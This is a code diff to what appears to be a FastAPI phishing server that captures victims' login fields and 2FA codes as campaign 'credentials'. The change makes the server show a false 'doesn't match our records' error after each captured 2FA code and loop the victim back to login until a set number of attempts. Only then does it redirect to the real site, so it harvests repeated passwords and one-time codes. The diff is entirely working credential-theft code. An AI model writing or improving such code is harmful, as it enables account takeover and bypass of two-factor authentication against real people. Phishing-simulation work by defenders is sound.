@@ -30,10 +30,6 @@ def register_routes(app: FastAPI) -> None:
             value = form_data.get(field_def.name, "")
             fields[field_def.name] = str(value)
 
-        tracker_key = client_ip
-        current_attempt = tracker.get(tracker_key, 0) + 1
-        tracker[tracker_key] = current_attempt
-
         credential = Credential(
             campaign_id=config._active_campaign_id or 0,
             fields=fields,
@@ -45,15 +41,24 @@ def register_routes(app: FastAPI) -> None:
         max_attempts = config.max_attempts
         redirect_url = config.redirect_url or manifest.redirect_url
 
+        if config.enable_2fa:
+            # With 2FA: always go to 2FA page after login submission.
+            # The 2FA handler decides whether to loop back or redirect.
+            tracker_key = client_ip
+            current_round = tracker.get(tracker_key, 0) + 1
+            tracker[tracker_key] = current_round
+
+            loader = request.app.state.loader
+            html = loader.render_2fa(post_url="/2fa")
+            return HTMLResponse(content=html)
+
+        # Without 2FA: use attempt tracking for error → redirect flow
+        tracker_key = client_ip
+        current_attempt = tracker.get(tracker_key, 0) + 1
+        tracker[tracker_key] = current_attempt
+
         if current_attempt >= max_attempts:
             tracker.pop(tracker_key, None)
-
-            # If 2FA is enabled, show the 2FA page instead of redirecting
-            if config.enable_2fa:
-                loader = request.app.state.loader
-                html = loader.render_2fa(post_url="/2fa")
-                return HTMLResponse(content=html)
-
             return RedirectResponse(url=redirect_url, status_code=303)
 
         loader = request.app.state.loader
@@ -69,13 +74,13 @@ def register_routes(app: FastAPI) -> None:
         config = request.app.state.config
         manifest = request.app.state.manifest
         on_credential = request.app.state.on_credential
+        tracker = request.app.state.attempt_tracker
 
         client_ip = request.client.host if request.client else "unknown"
         user_agent = request.headers.get("user-agent", "")
 
         code = str(form_data.get("code", ""))
 
-        # Send the 2FA code as a credential capture
         credential = Credential(
             campaign_id=config._active_campaign_id or 0,
             fields={"2fa_code": code},
@@ -84,9 +89,23 @@ def register_routes(app: FastAPI) -> None:
         )
         on_credential(credential)
 
-        # Redirect to the real site
         redirect_url = config.redirect_url or manifest.redirect_url
-        return RedirectResponse(url=redirect_url, status_code=303)
+        max_attempts = config.max_attempts
+        tracker_key = client_ip
+        current_round = tracker.get(tracker_key, 0)
+
+        if current_round >= max_attempts:
+            # Final round — redirect to real site
+            tracker.pop(tracker_key, None)
+            return RedirectResponse(url=redirect_url, status_code=303)
+
+        # Not the last round — show error, send back to login
+        loader = request.app.state.loader
+        html = loader.render_error(
+            post_url="/login",
+            error_message="The information that you've entered doesn't match our records. Please try again.",
+        )
+        return HTMLResponse(content=html)
 
     @app.get("/favicon.ico")
     async def favicon():
